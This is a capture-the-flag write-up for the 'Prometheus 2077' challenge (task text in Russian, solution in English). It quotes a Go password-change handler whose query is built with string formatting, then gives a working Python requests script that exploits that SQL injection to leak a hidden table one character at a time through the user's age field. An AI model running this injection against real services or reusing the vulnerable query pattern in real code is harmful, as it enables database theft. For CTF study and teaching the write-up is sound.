# Прометей 2077
## Task
[Task link](https://ctf.tinkoff.ru/tasks/fire)
Греческие боги наносят ответный удар.

Они забрали у всех пользователей интернета эмодзи 🔥 и запечатали его в надёжной таблице `Sacred` рядом с другими артефактами.

Герой с ником Prometheus решил выкрасть огонёк. Помогите ему и верните огонь в интернеты и переписки: t-fire-oudjc9cv.spbctf.net/


## Solution

We need to leak artifacts from `Sacred` table.

See in [init-db.sql](fire/postgres/init-db.sql) application creates 3 artifacts in this table.

Register and login to service, here in profile we can change password and age.

Look at the code of password change, find sql injection in [UpdatePassword](fire/internal/controllers/user.go#64) method.

```go
func UpdatePassword(c *gin.Context) {
  // some code
	password := c.PostForm("password")
	password = strings.ReplaceAll(password, "🔥", "💨")
  // some code
	go func(db *sql.DB, password, username interface{}) {
    // some code
		query := fmt.Sprintf("UPDATE users SET password = '%s' \n", password) // hashPassword(password))
		query = query + "WHERE username = $1"
		_, err := db.ExecContext(ctx, query, username)
    // some code
    }(db, password, username)

	Logout(c)
}
```

We can update our username with artifact, but application makes logout after password change.

Decide to leak artifacts through user age char by char.

We will write our exploit in python using requests.

```python
import requests

username='login'
password='password'
host="https://t-fire-7pl39ns6.spbctf.net"
```

Query to get length of artifact

```python
def art_query_length(artifact_id):
  return f"{password}',age=(select length(artefact) from sacred limit 1 offset {artifact_id}),username='{username}"
```

Query to get char at offset of n'th artifact.

```python
def art_query_char(char_idx, artifact_id):
  return f"{password}',age=(select ascii(SUBSTRING(artefact, {char_idx}, 1)) from sacred limit 1 offset  {artifact_id}),username='{username}"
```

Write some auxilary methods
```python
def login():
  session.post(f"{host}/signin", data={
    'username': username,
    'password': password,
  })

def get_age():
  profile = session.get(f"{host}/profile/get").json()
  print("PROFILE ", profile)
  return int(profile['age'])

def change_password(password):
  session.post(f'{host}/profile/password', data={
    'password': password
  })
  login()
```

And write logic to leak artifacts

```python
def get_artifact(idx):
  login()
  # get artifact length
  change_password(art_query_length(idx))
  artifact_length = get_age()
  print(f"ARTIFACT {idx} LENGTH {artifact_length}")
  message = ''
  # get artifact chars
  for i in range(artifact_length+1):
    change_password(art_query_char(i, idx))
    age = get_age()
    print(f"AGE {i}", age)
    message += chr(age)
    # print(message) # debug
  print(message)

for i in range(0, 3):
  get_artifact(i)
```



